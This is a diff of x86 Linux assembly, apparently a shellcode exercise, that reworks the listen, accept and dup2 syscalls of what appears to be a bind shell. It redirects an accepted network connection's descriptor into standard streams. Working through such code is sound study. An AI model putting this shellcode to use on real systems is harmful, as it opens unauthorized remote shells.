@@ -56,27 +56,29 @@ _start:
 	; Listen - 363
 	xor eax, eax
 	mov ax, 0x16b 		; Syscall 363 = Listen
-	pop ebx				; $ebx = File descriptor address
-	push ebx			; It gets pushed again
+	;pop ebx				; $ebx = File descriptor address
+	;push ebx			; It gets pushed again
 	xor ecx, ecx 		; $ecx = backlog = 0
 	int 0x80
 
 	; Accept - 364
 	xor eax, eax
 	mov ax, 0x16c 		; Syscall 364 = Accept
-	pop ebx 			; $ebx = File descriptor address
+	;pop ebx 			; $ebx = File descriptor address
 	xor ecx, ecx 		; $ecx = addr = 0, local address
 	xor edx, edx
-	mov dl, 0x10 		; $edx = Address length is 16 bits 
+	xor esi, esi
+	;mov dl, 0x10 		; $edx = Address length is 16 bits 
 	int 0x80
-	push eax			; New file descriptor gets pushed to stack
+	;push eax			; New file descriptor gets pushed to stack
 
 
 	;dup2 - 0
+	mov ebx, eax		; $ebx = File descriptor address
 	xor eax, eax
 	mov al, 0x3f  		; Syscall is 63 = Dup2
-	pop ebx 
-	push ebx 			; $ebx = File descriptor address
+	;pop ebx 
+	push ebx 			
 	xor ecx, ecx 		; $ecx = New file descriptor = 0
 	int 0x80
 
